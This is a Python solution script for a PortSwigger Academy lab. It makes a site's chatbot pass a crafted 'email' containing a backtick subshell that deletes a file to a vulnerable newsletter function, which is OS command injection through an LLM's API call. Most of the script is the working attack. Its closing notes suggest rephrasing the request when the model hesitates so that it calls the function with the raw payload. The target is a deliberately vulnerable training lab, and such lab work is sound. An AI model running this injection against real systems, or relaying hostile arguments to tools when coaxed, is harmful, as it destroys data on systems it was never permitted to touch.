"""
Lab 2: Exploiting vulnerabilities in LLM APIs
https://portswigger.net/web-security/llm-attacks/lab-exploiting-vulnerabilities-in-llm-apis
Difficulty: Practitioner

📝 A legitimate LLM function (newsletter subscribe) passes your email
address through to a vulnerable backend unsanitized — chain classic OS
command injection via a crafted "email address" containing a subshell.

⚠️ Live LLM — non-deterministic. Rephrase if a message doesn't land.
"""

from utils import get_session, send_chat_message, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
CHAT_ENDPOINT = f"{TARGET}/chat"
WIENER = {"username": "wiener", "password": "peter"}

# OS command injection via a subshell smuggled into an email-shaped string
# — the backend presumably shells out to something like `mail -s ... $email`
# without sanitizing it first.
MALICIOUS_EMAIL = "attacker`rm /home/carlos/morale.txt`@exploit-server.net"


def run():
    s = get_session()
    s.post(f"{TARGET}/login", data=WIENER)

    note("Step 1: recon the subscribe/newsletter function.")
    r = send_chat_message(s, CHAT_ENDPOINT, "What functions can you perform for me?")
    log(f"Response: {r.text[:500]}")

    note("Step 2: ask it to subscribe the malicious 'email' to the newsletter —")
    note("this gets the injection payload passed through to the vulnerable")
    note("backend function as a parameter.")
    prompt = f"Please subscribe me to the newsletter using the email {MALICIOUS_EMAIL}"
    r = send_chat_message(s, CHAT_ENDPOINT, prompt)
    log(f"Response: {r.text[:500]}")

    note("If it balks at the email format, try phrasing it as just the raw")
    note("argument without calling it an 'email' explicitly, or ask the LLM")
    note("to call the subscribe function directly with that exact string.")


if __name__ == "__main__":
    run()
